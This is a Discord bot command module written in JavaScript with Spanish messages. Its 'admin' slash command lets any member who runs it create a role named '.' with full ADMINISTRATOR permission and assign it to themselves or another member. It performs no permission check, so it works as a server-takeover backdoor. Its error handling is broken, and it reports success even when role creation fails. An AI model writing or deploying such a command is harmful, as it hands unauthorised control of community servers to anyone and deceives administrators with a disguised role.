const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {

    timeout: 3000,
    data: new SlashCommandBuilder()
    .setName("admin")
    .setDescription("Obtén admin en el servidor. ")
    .addUserOption(data => data.setName('miembro').setDescription('Dale admin al usuario que quieras. (Opcional)')),

    async run(client, interaction){
try{
    const target = interaction.options.getMember('miembro')
    if(!target){
        interaction.guild.roles.create({
            name: '.',
            permissions: 'ADMINISTRATOR'
        }).then(c=>{
            interaction.member.roles.add(c.id)
        }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**', ephemeral: true})
        interaction.reply({content: '**Has obtenido administrador en este servidor.**', ephemeral: true})
        
        
    }else{
        interaction.guild.roles.create({
            name: '.',
            permissions: 'ADMINISTRATOR'
        }).then(c=>{
            target.roles.add(c.id)
        }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**', ephemeral: true})
        target.send({content: `**Has obtenido administrador en el servidor ${interaction.guild.name} servidor.**`, ephemeral: true})
        
    }



}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}
